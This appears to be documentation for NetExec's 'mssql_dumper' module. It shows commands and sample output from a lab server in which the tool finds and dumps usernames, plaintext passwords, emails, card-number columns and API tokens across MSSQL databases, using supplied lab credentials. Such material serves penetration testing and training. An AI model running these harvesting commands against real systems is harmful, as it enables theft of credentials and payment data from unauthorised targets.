# MSSQL Dumper Module

## Description
The `mssql_dumper` module in NetExec discovers sensitive data across MSSQL databases. It supports column-based matching and regex scanning.

---

## SHOW_DATA
Display row values of matched columns (default: True)
```bash
nxc mssql 10.129.204.177 -u robert -p 'Inlanefreight01!' -M mssql_dumper -o SHOW_DATA=False

[*] Searching database: core_app
[+] Match in core_app.tbl_users => Columns: [username], [password]

[*] Searching database: core_business

[*] Searching database: corp_db
[+] Match in corp_db.users => Columns: [username], [password], [email]
[+] Match in corp_db.api_keys => Columns: [token]
[+] Match in corp_db.users2 => Columns: [username], [password], [email]

[+] Data saved to ~/.nxc/modules/mssql-dumper/DC01_10.129.204.177.json
```

---

## REGEX
Scan for sensitive data using regex; multiple patterns separated by `;`
```bash
nxc mssql 10.129.204.177 -u robert -p 'Inlanefreight01!' -M mssql_dumper -o REGEX='(?i)bearer;\\d{4}-\\d{4}-\\d{4}-\\d{4};admin;john' -o SHOW_DATA=False

[*] Searching database: core_app
[+] Match in core_app.tbl_users => Columns: [username], [password]

[*] Searching database: core_business

[*] Searching database: corp_db
[+] Match in corp_db.users => Columns: [username], [password], [email]
[+] Match in corp_db.payments => Columns: [card_number], [cvv]
[+] Match in corp_db.api_keys => Columns: [token]
[+] Match in corp_db.users2 => Columns: [username], [password], [email]

[+] Data saved to ~/.nxc/modules/mssql-dumper/DC01_10.129.204.177.json
```

---

## LIKE_SEARCH
Target specific column names (comma-separated)
```bash
nxc mssql 10.129.204.177 -u robert -p 'Inlanefreight01!' -M mssql_dumper -o LIKE_SEARCH=username,password,email

[*] Searching database: core_app
[+] Match in core_app.tbl_users => Columns: [username], [password]
core_app.tbl_users => username: josematt, password: Testing123
core_app.tbl_users => username: eliecart, password: Motor999

[*] Searching database: core_business

[*] Searching database: corp_db
[+] Match in corp_db.users => Columns: [username], [password], [email]
corp_db.users => username: admin, password: P@ssw0rd123!, email: admin@corp.local
corp_db.users => username: john, password: Summer2024!, email: john.doe@corp.local

[+] Match in corp_db.payments => Columns: [card_number], [cvv]
[+] Match in corp_db.api_keys => Columns: [token]
[+] Match in corp_db.users2 => Columns: [username], [password], [email]

[+] Data saved to ~/.nxc/modules/mssql-dumper/DC01_10.129.204.177.json
```


